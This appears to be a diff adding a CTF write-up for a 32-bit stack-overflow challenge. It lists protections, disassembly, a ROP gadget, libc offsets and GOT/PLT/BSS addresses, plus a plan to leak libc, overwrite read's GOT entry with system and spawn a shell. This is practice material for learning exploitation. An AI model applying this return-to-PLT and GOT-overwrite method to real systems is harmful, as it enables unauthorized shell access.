@@ -1,0 +1,95 @@
+server: nc ctf.j0n9hyun.xyz 3021
+
+insight:
+	got is data section so no permission for execute.
+	so ret .plt
+
+scenario:
+	1 write(1, plt_read, sizeof(*)) // &read() > stdout
+	2 read(0, bss, sizeof(binsh)) // stdin("/bin/sh") > bss
+	3 read(0, read_got, sizeof(*)) // GOT overwrite read() to stdin(&system())
+	4 read(binsh) // system("/bin/sh") 
+
+to know:
+	plt; read write 
+	got; read // for overwrite 
+	offset; read, system
+	&; read, system // &read - read_off = &libc 
+	bss 
+
+checksec:
+	CANARY    : disabled
+	FORTIFY   : disabled
+	NX        : ENABLED
+	PIE       : disabled
+	RELRO     : Partial -> GOT overwrite possible
+
+disas main:
+	Dump of assembler code for function main:
+	   0x08048470 <+0>:     lea    ecx,[esp+0x4]
+	   0x08048474 <+4>:     and    esp,0xfffffff0
+	   0x08048477 <+7>:     push   DWORD PTR [ecx-0x4]
+	   0x0804847a <+10>:    push   ebp
+	   0x0804847b <+11>:    mov    ebp,esp
+	   0x0804847d <+13>:    push   ecx
+	   0x0804847e <+14>:    sub    esp,0x4
+	   0x08048481 <+17>:    call   0x804844b <vulnerable_function>
+	   0x08048486 <+22>:    sub    esp,0x4
+	   0x08048489 <+25>:    push   0xe
+	   0x0804848b <+27>:    push   0x8048530
+	   0x08048490 <+32>:    push   0x1
+	   0x08048492 <+34>:    call   0x8048340 <write@plt>
+	   0x08048497 <+39>:    add    esp,0x10
+	   0x0804849a <+42>:    mov    eax,0x0
+	   0x0804849f <+47>:    mov    ecx,DWORD PTR [ebp-0x4]
+	   0x080484a2 <+50>:    leave  
+	   0x080484a3 <+51>:    lea    esp,[ecx-0x4]
+	   0x080484a6 <+54>:    ret    
+	End of assembler dump.
+
+disas vulnerable_function:
+	Dump of assembler code for function vulnerable_function:
+	   0x0804844b <+0>:     push   ebp
+	   0x0804844c <+1>:     mov    ebp,esp
+	   0x0804844e <+3>:     sub    esp,0x88
+	   0x08048454 <+9>:     sub    esp,0x4
+	   0x08048457 <+12>:    push   0x100 // vulnerable! 
+	   0x0804845c <+17>:    lea    eax,[ebp-0x88] // vulnerable!
+	   0x08048462 <+23>:    push   eax
+	   0x08048463 <+24>:    push   0x0
+	   0x08048465 <+26>:    call   0x8048310 <read@plt>
+	   0x0804846a <+31>:    add    esp,0x10
+	   0x0804846d <+34>:    nop
+	   0x0804846e <+35>:    leave  
+	   0x0804846f <+36>:    ret    
+	End of assembler dump.
+
+ida hex-lay:
+	ssize_t vulnerable_function()
+	{
+	  char buf; // [esp+0h] [ebp-88h]
+
+	  return read(0, &buf, 0x100u);
+	}
+
+gadget(objdump -d rop | egrep 'pop|ret'):
+	 8048509:       5e                      pop    %esi
+	 804850a:       5f                      pop    %edi
+	 804850b:       5d                      pop    %ebp
+	 804850c:       c3                      ret    
+
+offset: 
+	__write 0x000d43c0
+	__read 0x000d4350
+	__system 0x0003a940
+
+plt:
+	_read 0x08048310
+	_write 0x08048340
+
+got:
+	read 0x0804a00c
+	write 0x0804a018
+
+bss: 
+	0x0804a024
